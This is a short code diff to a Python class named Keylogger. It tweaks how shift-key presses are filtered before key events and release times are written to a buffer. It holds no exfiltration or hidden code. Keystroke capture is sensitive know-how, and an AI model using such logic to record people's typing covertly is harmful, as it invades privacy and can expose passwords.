@@ -31,7 +31,7 @@ class Keylogger:
         # Special Case if key is shift
         if key_string == "KEY.SHIFT":
             for char in self.__pressed_keys:
-                if not char.isalpha() and not char == "KEY.SHIFT":
+                if not char.replace('\'', '').isalpha() and not char == "KEY.SHIFT":
                     self.__buffer.write_to_buffer([char, release_time, False])
                     self.__pressed_keys.remove(char)
         self.__buffer.write_to_buffer([key_string, release_time, False])
